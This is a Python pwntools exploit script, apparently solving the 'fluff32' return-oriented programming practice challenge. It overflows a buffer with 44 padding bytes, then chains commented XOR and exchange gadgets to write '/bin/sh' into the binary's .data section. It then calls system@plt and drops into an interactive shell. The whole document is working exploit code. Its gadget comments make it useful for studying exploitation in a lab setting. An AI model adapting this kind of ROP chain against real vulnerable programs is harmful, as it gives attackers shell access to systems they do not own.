#!/usr/bin/env python

from pwn import *

p = process("./fluff32")
p.recv(1024)

payload = (
    "\x90" * 44 +
    p32(0x0804868c) + # mov edx, 0xdefaced0 ; ret
    p32(0x080483e1) + # pop ebx ; ret
    p32(0xd6fe6ef8) + # .data(0x804a028) ^ 0xdefaced0 =  0xd6fe6ef8
    p32(0x0804867b) + # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
    p32(0x42424242) + # trash pop ebp
    p32(0x08048689) + # xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
    p32(0x42424242) + # trash pop ebp

    p32(0x080483e1) + # pop ebx ; ret
    p32(0xb093acff) + # 0x6e69622f (/bin) ^ 0xdefaced0 = 0xb093acff 
    p32(0x0804867b) + # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
    p32(0x42424242) + # trash pop ebp

    p32(0x08048693) + # mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
    p32(0x0) + # 0 pop ebp
    p32(0x0) + # 0 pop ebx

    p32(0x080488ba) + # inc ecx ; ret
    p32(0x080488ba) + # inc ecx ; ret
    p32(0x080488ba) + # inc ecx ; ret
    p32(0x080488ba) + # inc ecx ; ret

    p32(0x080483e1) + # pop ebx ; ret
    p32(0x6e011100) + # 0x68732f (/sh) ^ 0x6e69622f (/bin) = 0x6e011100 
    p32(0x0804867b) + # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
    p32(0x42424242) + # trash pop ebp
   
    p32(0x08048693) + # mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
    p32(0x0) + # 0 pop ebp
    p32(0x0) + # 0 pop ebx

    p32(0x8048430) + # system@plt
    p32(0x42424242) + # ebp
    p32(0x804a028)
)

p.sendline(payload)
p.interactive()

p.close()
